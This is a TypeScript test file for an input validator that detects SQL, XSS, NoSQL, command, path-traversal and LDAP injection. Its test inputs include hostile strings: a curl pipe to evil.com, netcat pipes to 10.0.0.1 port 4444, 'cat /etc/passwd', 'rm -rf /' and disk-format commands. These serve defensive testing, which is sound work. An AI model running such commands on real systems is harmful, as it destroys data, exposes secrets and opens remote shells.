/**
 * @file enhancedValidator.mutations.test.ts
 * @description Mutation-killing tests for EnhancedValidator input validation.
 *              Targets boundary conditions, disabled flags, pattern detection,
 *              and sanitization branches not covered by the existing test file.
 * @layer test
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

vi.mock("isomorphic-dompurify", () => ({
  default: {
    sanitize: vi.fn((input: string) => input.replace(/<script[^>]*>.*?<\/script>/gi, "")),
  },
}));

vi.mock("validator", () => ({
  default: {
    isURL: vi.fn((s: string) => /^https?:\/\/.+/.test(s)),
    isEmail: vi.fn((s: string) => s.includes("@") && s.includes(".")),
    escape: vi.fn((s: string) =>
      s.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/&/g, "&amp;")
    ),
    normalizeEmail: vi.fn((s: string) => s.toLowerCase()),
  },
}));

vi.mock("../../../src/lib/logger.js", () => ({
  logger: { warn: vi.fn(), error: vi.fn(), info: vi.fn() },
}));

import { EnhancedValidator } from "../../../src/security/enhancedValidator.js";

describe("EnhancedValidator — mutation-killing: input validation", () => {
  let v: EnhancedValidator;

  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    if (v) v.destroy();
  });

  // ------------------------------------------------------------------
  // validateInput: type dispatch and fallback
  // ------------------------------------------------------------------
  describe("validateInput type dispatch", () => {
    it("returns valid with sanitized for null input", () => {
      v = new EnhancedValidator();
      const result = v.validateInput(null);
      expect(result.isValid).toBe(true);
      expect(result.sanitized).toBeNull();
      expect(result.threats).toEqual([]);
      expect(result.risk).toBe("low");
    });

    it("returns valid with sanitized for undefined input", () => {
      v = new EnhancedValidator();
      const result = v.validateInput(undefined);
      expect(result.isValid).toBe(true);
      expect(result.sanitized).toBeUndefined();
      expect(result.threats).toEqual([]);
    });

    it("returns valid with sanitized for number 0", () => {
      v = new EnhancedValidator();
      const result = v.validateInput(0);
      expect(result.isValid).toBe(true);
      expect(result.sanitized).toBe(0);
    });

    it("returns valid with sanitized for boolean false", () => {
      v = new EnhancedValidator();
      const result = v.validateInput(false);
      expect(result.isValid).toBe(true);
      expect(result.sanitized).toBe(false);
    });

    it("delegates arrays to validateObject (arrays are typeof object)", () => {
      v = new EnhancedValidator();
      const result = v.validateInput(["safe"]);
      expect(result.isValid).toBe(true);
    });
  });

  // ------------------------------------------------------------------
  // validateString: boundary lengths
  // ------------------------------------------------------------------
  describe("validateString length boundaries", () => {
    it("rejects string exactly 1 char over maxStringLength", () => {
      v = new EnhancedValidator({ maxStringLength: 10 });
      const result = v.validateInput("a".repeat(11));
      expect(result.isValid).toBe(false);
      expect(result.threats).toContain("EXCESSIVE_LENGTH");
      expect(result.risk).toBe("medium");
      expect(result.sanitized).toBeUndefined();
    });

    it("accepts string exactly at maxStringLength", () => {
      v = new EnhancedValidator({ maxStringLength: 10 });
      const result = v.validateInput("a".repeat(10));
      expect(result.isValid).toBe(true);
      expect(result.sanitized).toBeDefined();
    });

    it("accepts string 1 char under maxStringLength", () => {
      v = new EnhancedValidator({ maxStringLength: 10 });
      const result = v.validateInput("a".repeat(9));
      expect(result.isValid).toBe(true);
    });

    it("excessive length returns early without checking patterns", () => {
      v = new EnhancedValidator({ maxStringLength: 5 });
      const result = v.validateInput("select x from y");
      expect(result.threats).toEqual(["EXCESSIVE_LENGTH"]);
      expect(result.threats).not.toContain("SQL_INJECTION");
    });
  });

  // ------------------------------------------------------------------
  // validateString: disabled protections
  // ------------------------------------------------------------------
  describe("validateString with disabled protections", () => {
    it("skips SQL injection detection when disabled", () => {
      v = new EnhancedValidator({ enableSQLInjectionProtection: false });
      const result = v.validateInput("SELECT * FROM users");
      expect(result.threats).not.toContain("SQL_INJECTION");
    });

    it("skips XSS detection when disabled", () => {
      v = new EnhancedValidator({ enableXSSProtection: false });
      const result = v.validateInput("<script>alert(1)</script>");
      expect(result.threats).not.toContain("XSS_ATTEMPT");
    });

    it("skips NoSQL detection when disabled", () => {
      v = new EnhancedValidator({ enableNoSQLInjectionProtection: false });
      const result = v.validateInput('{"$where": "1==1"}');
      expect(result.threats).not.toContain("NOSQL_INJECTION");
    });

    it("skips command injection detection when disabled", () => {
      v = new EnhancedValidator({ enableCommandInjectionProtection: false });
      const result = v.validateInput("; rm -rf /");
      expect(result.threats).not.toContain("COMMAND_INJECTION");
    });

    it("skips path traversal detection when disabled", () => {
      v = new EnhancedValidator({ enablePathTraversalProtection: false });
      const result = v.validateInput("../../etc/passwd");
      expect(result.threats).not.toContain("PATH_TRAVERSAL");
    });

    it("skips LDAP injection detection when disabled", () => {
      v = new EnhancedValidator({ enableLDAPInjectionProtection: false });
      const result = v.validateInput("*)|(&(");
      expect(result.threats).not.toContain("LDAP_INJECTION");
    });
  });

  // ------------------------------------------------------------------
  // SQL injection: each pattern individually
  // ------------------------------------------------------------------
  describe("SQL injection individual patterns", () => {
    beforeEach(() => {
      v = new EnhancedValidator({
        enableXSSProtection: false,
        enableCommandInjectionProtection: false,
        enablePathTraversalProtection: false,
        enableNoSQLInjectionProtection: false,
        enableLDAPInjectionProtection: false,
      });
    });

    it("detects UPDATE SET pattern", () => {
      const result = v.validateInput("update users set name='x'");
      expect(result.threats).toContain("SQL_INJECTION");
      expect(result.risk).toBe("critical");
    });

    it("detects DELETE FROM pattern", () => {
      const result = v.validateInput("delete from users");
      expect(result.threats).toContain("SQL_INJECTION");
    });

    it("detects UNION ALL SELECT pattern", () => {
      const result = v.validateInput("union all select 1");
      expect(result.threats).toContain("SQL_INJECTION");
    });

    it("detects information_schema pattern", () => {
      const result = v.validateInput("information_schema.tables");
      expect(result.threats).toContain("SQL_INJECTION");
    });

    it("detects pg_sleep pattern", () => {
      const result = v.validateInput("pg_sleep(5)");
      expect(result.threats).toContain("SQL_INJECTION");
    });

    it("detects waitfor delay pattern", () => {
      const result = v.validateInput("waitfor delay '00:00:05'");
      expect(result.threats).toContain("SQL_INJECTION");
    });

    it("detects benchmark pattern", () => {
      const result = v.validateInput("benchmark(1000000,MD5('test'))");
      expect(result.threats).toContain("SQL_INJECTION");
    });
  });

  // ------------------------------------------------------------------
  // XSS: each pattern individually
  // ------------------------------------------------------------------
  describe("XSS individual patterns", () => {
    beforeEach(() => {
      v = new EnhancedValidator({
        enableSQLInjectionProtection: false,
        enableCommandInjectionProtection: false,
        enablePathTraversalProtection: false,
        enableNoSQLInjectionProtection: false,
        enableLDAPInjectionProtection: false,
      });
    });

    it("detects object tag", () => {
      const result = v.validateInput("<object data='x'></object>");
      expect(result.threats).toContain("XSS_ATTEMPT");
    });

    it("detects embed tag", () => {
      const result = v.validateInput("<embed src='x'>");
      expect(result.threats).toContain("XSS_ATTEMPT");
    });

    it("detects link tag", () => {
      const result = v.validateInput("<link rel='stylesheet' href='x'>");
      expect(result.threats).toContain("XSS_ATTEMPT");
    });

    it("detects meta tag", () => {
      const result = v.validateInput("<meta http-equiv='refresh'>");
      expect(result.threats).toContain("XSS_ATTEMPT");
    });

    it("detects vbscript protocol", () => {
      const result = v.validateInput("vbscript:alert(1)");
      expect(result.threats).toContain("XSS_ATTEMPT");
    });

    it("detects inline event handler pattern", () => {
      const result = v.validateInput("onclick=alert(1)");
      expect(result.threats).toContain("XSS_ATTEMPT");
    });

    it("risk is high for XSS", () => {
      const result = v.validateInput("<script>x</script>");
      expect(result.risk).toBe("high");
    });
  });

  // ------------------------------------------------------------------
  // NoSQL: individual patterns
  // ------------------------------------------------------------------
  describe("NoSQL injection individual patterns", () => {
    beforeEach(() => {
      v = new EnhancedValidator({
        enableSQLInjectionProtection: false,
        enableXSSProtection: false,
        enableCommandInjectionProtection: false,
        enablePathTraversalProtection: false,
        enableLDAPInjectionProtection: false,
      });
    });

    it("detects $lt operator", () => {
      const result = v.validateInput('{"val": {"$lt": 100}}');
      expect(result.threats).toContain("NOSQL_INJECTION");
    });

    it("detects $or operator", () => {
      const result = v.validateInput('{"$or": []}');
      expect(result.threats).toContain("NOSQL_INJECTION");
    });

    it("detects $and operator", () => {
      const result = v.validateInput('{"$and": []}');
      expect(result.threats).toContain("NOSQL_INJECTION");
    });

    it("risk is high for NoSQL injection", () => {
      const result = v.validateInput("$where");
      expect(result.risk).toBe("high");
    });
  });

  // ------------------------------------------------------------------
  // Command injection: individual patterns
  // ------------------------------------------------------------------
  describe("Command injection individual patterns", () => {
    beforeEach(() => {
      v = new EnhancedValidator({
        enableSQLInjectionProtection: false,
        enableXSSProtection: false,
        enablePathTraversalProtection: false,
        enableNoSQLInjectionProtection: false,
        enableLDAPInjectionProtection: false,
      });
    });

    it("detects del command", () => {
      const result = v.validateInput("; del /s /q c:\\");
      expect(result.threats).toContain("COMMAND_INJECTION");
    });

    it("detects format command", () => {
      const result = v.validateInput("; format c:");
      expect(result.threats).toContain("COMMAND_INJECTION");
    });

    it("detects fdisk command", () => {
      const result = v.validateInput("; fdisk /dev/sda");
      expect(result.threats).toContain("COMMAND_INJECTION");
    });

    it("detects curl pipe", () => {
      const result = v.validateInput("| curl http://evil.com");
      expect(result.threats).toContain("COMMAND_INJECTION");
    });

    it("detects nc pipe", () => {
      const result = v.validateInput("| nc 10.0.0.1 4444");
      expect(result.threats).toContain("COMMAND_INJECTION");
    });

    it("detects netcat pipe", () => {
      const result = v.validateInput("| netcat 10.0.0.1 4444");
      expect(result.threats).toContain("COMMAND_INJECTION");
    });

    it("detects && operator", () => {
      const result = v.validateInput("echo hello && cat /etc/passwd");
      expect(result.threats).toContain("COMMAND_INJECTION");
    });

    it("detects || operator", () => {
      const result = v.validateInput("false || cat /etc/passwd");
      expect(result.threats).toContain("COMMAND_INJECTION");
    });
  });

  // ------------------------------------------------------------------
  // Path traversal: individual patterns
  // ------------------------------------------------------------------
  describe("Path traversal individual patterns", () => {
    beforeEach(() => {
      v = new EnhancedValidator({
        enableSQLInjectionProtection: false,
        enableXSSProtection: false,
        enableCommandInjectionProtection: false,
        enableNoSQLInjectionProtection: false,
        enableLDAPInjectionProtection: false,
      });
    });

    it("detects backslash-encoded traversal (%2e%2e\\)", () => {
      const result = v.validateInput("%2e%2e\\secret");
      expect(result.threats).toContain("PATH_TRAVERSAL");
    });

    it("risk is high for path traversal", () => {
      const result = v.validateInput("../secret");
      expect(result.risk).toBe("high");
    });
  });

  // ------------------------------------------------------------------
  // LDAP injection: individual patterns
  // ------------------------------------------------------------------
  describe("LDAP injection individual patterns", () => {
    beforeEach(() => {
      v = new EnhancedValidator({
        enableSQLInjectionProtection: false,
        enableXSSProtection: false,
        enableCommandInjectionProtection: false,
        enablePathTraversalProtection: false,
        enableNoSQLInjectionProtection: false,
      });
    });

    it("detects *) pattern", () => {
      expect(v.validateInput("*)").threats).toContain("LDAP_INJECTION");
    });

    it("detects |) pattern", () => {
      expect(v.validateInput("|)").threats).toContain("LDAP_INJECTION");
    });

    it("detects &) pattern", () => {
      expect(v.validateInput("&)").threats).toContain("LDAP_INJECTION");
    });

    it("detects !) pattern", () => {
      expect(v.validateInput("!)").threats).toContain("LDAP_INJECTION");
    });

    it("detects (* pattern", () => {
      expect(v.validateInput("(*").threats).toContain("LDAP_INJECTION");
    });

    it("detects (| pattern", () => {
      expect(v.validateInput("(|").threats).toContain("LDAP_INJECTION");
    });

    it("detects (& pattern", () => {
      expect(v.validateInput("(&").threats).toContain("LDAP_INJECTION");
    });

    it("detects (! pattern", () => {
      expect(v.validateInput("(!").threats).toContain("LDAP_INJECTION");
    });

    it("risk is high for LDAP injection", () => {
      expect(v.validateInput("*)").risk).toBe("high");
    });
  });

  // ------------------------------------------------------------------
  // Dangerous strings: each individually
  // ------------------------------------------------------------------
  describe("Dangerous strings individual detection", () => {
    beforeEach(() => {
      v = new EnhancedValidator({
        enableSQLInjectionProtection: false,
        enableXSSProtection: false,
        enableCommandInjectionProtection: false,
        enablePathTraversalProtection: false,
        enableNoSQLInjectionProtection: false,
        enableLDAPInjectionProtection: false,
      });
    });

    const dangerousStrings = [
      "eval(",
      "Function(",
      "setTimeout(",
      "setInterval(",
      "new Function",
      "require(",
      "process.env",
      "__dirname",
      "__filename",
    ];

    for (const ds of dangerousStrings) {
      it(`detects "${ds}"`, () => {
        const result = v.validateInput(`prefix ${ds} suffix`);
        expect(result.isValid).toBe(false);
        expect(result.threats).toContain("DANGEROUS_FUNCTION");
        expect(result.risk).toBe("high");
      });
    }

    it("does not flag safe string without dangerous substrings", () => {
      const result = v.validateInput("hello world safe string");
      expect(result.isValid).toBe(true);
      expect(result.threats).toEqual([]);
    });
  });

  // ------------------------------------------------------------------
  // validateString: sanitized output on valid input
  // ------------------------------------------------------------------
  describe("validateString sanitized output", () => {
    it("returns sanitized string when no threats detected", () => {
      v = new EnhancedValidator();
      const result = v.validateInput("safe text");
      expect(result.isValid).toBe(true);
      expect(result.sanitized).toBeDefined();
      expect(typeof result.sanitized).toBe("string");
    });

    it("does not return sanitized when threats are found", () => {
      v = new EnhancedValidator();
      const result = v.validateInput("<script>x</script>");
      expect(result.isValid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });
  });

  // ------------------------------------------------------------------
  // validateObject: edge cases
  // ------------------------------------------------------------------
  describe("validateObject edge cases", () => {
    beforeEach(() => {
      v = new EnhancedValidator();
    });

    it("returns valid sanitized for empty object", () => {
      const result = v.validateInput({});
      expect(result.isValid).toBe(true);
      expect(result.sanitized).toEqual({});
      expect(result.threats).toEqual([]);
    });

    it("skips key when key validation fails (dangerous function in key)", () => {
      // Use DANGEROUS_STRINGS detection (not regex with g flag that has stateful lastIndex)
      const result = v.validateInput({ "eval(code)": "safe" });
      expect(result.isValid).toBe(false);
      expect(result.threats).toContain("DANGEROUS_FUNCTION");
    });

    it("skips entry when value validation fails", () => {
      const result = v.validateInput({ safe_key: "<script>x</script>" });
      expect(result.isValid).toBe(false);
      expect(result.sanitized).toBeUndefined();
    });

    it("returns undefined sanitized when threats found in object", () => {
      const result = v.validateInput({ key: "<script>x</script>" });
      expect(result.sanitized).toBeUndefined();
    });

    it("uses sanitized key in output when key gets sanitized", () => {
      v.destroy();
      v = new EnhancedValidator({
        enableSQLInjectionProtection: false,
        enableXSSProtection: false,
        enableCommandInjectionProtection: false,
        enablePathTraversalProtection: false,
        enableNoSQLInjectionProtection: false,
        enableLDAPInjectionProtection: false,
      });
      const result = v.validateInput({ "my-key": "value" });
      expect(result.isValid).toBe(true);
      expect(result.sanitized).toHaveProperty("my_key");
    });

    it("accumulates risk from multiple invalid entries", () => {
      const input = { a: "../../etc/passwd", b: "SELECT * FROM users" };
      const result = v.validateInput(input);
      expect(result.isValid).toBe(false);
      expect(result.risk).toBe("critical");
    });
  });

  // ------------------------------------------------------------------
  // validateArray: edge cases
  // ------------------------------------------------------------------
  describe("validateArray edge cases", () => {
    beforeEach(() => {
      v = new EnhancedValidator();
    });

    it("returns valid for empty array", () => {
      const result = v.validateInput([]);
      expect(result.isValid).toBe(true);
      expect(result.threats).toEqual([]);
    });

    it("returns sanitized when valid", () => {
      const result = v.validateInput(["hello", "world"]);
      expect(result.isValid).toBe(true);
    });

    it("does not include sanitized when threats found", () => {
      const result = v.validateInput(["safe", "<script>x</script>"]);
      expect(result.isValid).toBe(false);
    });

    it("accumulates threats from multiple invalid items", () => {
      const result = v.validateInput(["<script>x</script>", "../../etc/passwd"]);
      expect(result.isValid).toBe(false);
      expect(result.threats.length).toBeGreaterThanOrEqual(2);
    });
  });

  // ------------------------------------------------------------------
  // sanitizeString: all contexts
  // ------------------------------------------------------------------
  describe("sanitizeString context branches", () => {
    beforeEach(() => {
      v = new EnhancedValidator();
    });

    it("html context calls DOMPurify.sanitize", () => {
      const result = v.sanitizeString("<b>bold</b>", "html");
      expect(typeof result).toBe("string");
    });

    it("url context returns escaped for valid URL", () => {
      const result = v.sanitizeString("https://example.com", "url");
      expect(result).toBeDefined();
      expect(result.length).toBeGreaterThan(0);
    });

    it("url context returns empty string for invalid URL", async () => {
      const { default: validatorLib } = await import("validator");
      vi.mocked(validatorLib.isURL).mockReturnValueOnce(false);
      const result = v.sanitizeString("not-a-url", "url");
      expect(result).toBe("");
    });

    it("email context normalizes valid email", () => {
      const result = v.sanitizeString("Test@Example.COM", "email");
      expect(result).toBe("test@example.com");
    });

    it("email context returns empty for invalid email", async () => {
      const { default: validatorLib } = await import("validator");
      vi.mocked(validatorLib.isEmail).mockReturnValueOnce(false);
      const result = v.sanitizeString("not-an-email", "email");
      expect(result).toBe("");
    });

    it("email context falls back to input when normalizeEmail returns false", async () => {
      const { default: validatorLib } = await import("validator");
      vi.mocked(validatorLib.isEmail).mockReturnValueOnce(true);
      vi.mocked(validatorLib.normalizeEmail).mockReturnValueOnce(false as unknown as string);
      const result = v.sanitizeString("test@example.com", "email");
      expect(result).toBe("test@example.com");
    });

    it("filename context replaces special chars with underscore", () => {
      const result = v.sanitizeString("file name!@#.txt", "filename");
      expect(result).toBe("file_name___.txt");
    });

    it("filename context preserves valid chars", () => {
      const result = v.sanitizeString("valid-file_name.txt", "filename");
      expect(result).toBe("valid-file_name.txt");
    });

    it("object_key context replaces hyphens and special chars", () => {
      const result = v.sanitizeString("key-name.value", "object_key");
      expect(result).toBe("key_name_value");
    });

    it("default context calls validator.escape", () => {
      const result = v.sanitizeString("test <value>", "unknown_context");
      // Mock escape replaces < → &lt;, > → &gt;, then & → &amp; (double-encodes)
      expect(result).toBe("test &amp;lt;value&amp;gt;");
    });
  });

  // ------------------------------------------------------------------
  // getMaxRisk: all combinations and unknowns
  // ------------------------------------------------------------------
  describe("getMaxRisk all combinations", () => {
    beforeEach(() => {
      v = new EnhancedValidator();
    });

    it("low vs low returns low", () => {
      expect(v.getMaxRisk("low", "low")).toBe("low");
    });

    it("low vs medium returns medium", () => {
      expect(v.getMaxRisk("low", "medium")).toBe("medium");
    });

    it("low vs high returns high", () => {
      expect(v.getMaxRisk("low", "high")).toBe("high");
    });

    it("low vs critical returns critical", () => {
      expect(v.getMaxRisk("low", "critical")).toBe("critical");
    });

    it("medium vs low returns medium", () => {
      expect(v.getMaxRisk("medium", "low")).toBe("medium");
    });

    it("medium vs high returns high", () => {
      expect(v.getMaxRisk("medium", "high")).toBe("high");
    });

    it("medium vs critical returns critical", () => {
      expect(v.getMaxRisk("medium", "critical")).toBe("critical");
    });

    it("high vs low returns high", () => {
      expect(v.getMaxRisk("high", "low")).toBe("high");
    });

    it("high vs medium returns high", () => {
      expect(v.getMaxRisk("high", "medium")).toBe("high");
    });

    it("high vs high returns high", () => {
      expect(v.getMaxRisk("high", "high")).toBe("high");
    });

    it("critical vs low returns critical", () => {
      expect(v.getMaxRisk("critical", "low")).toBe("critical");
    });

    it("critical vs critical returns critical", () => {
      expect(v.getMaxRisk("critical", "critical")).toBe("critical");
    });

    it("unknown current risk defaults to level 1 (low)", () => {
      expect(v.getMaxRisk("unknown", "medium")).toBe("medium");
    });

    it("unknown new risk defaults to level 1 (low)", () => {
      expect(v.getMaxRisk("high", "unknown")).toBe("high");
    });

    it("both unknown returns low", () => {
      expect(v.getMaxRisk("unknown", "unknown")).toBe("low");
    });
  });
});
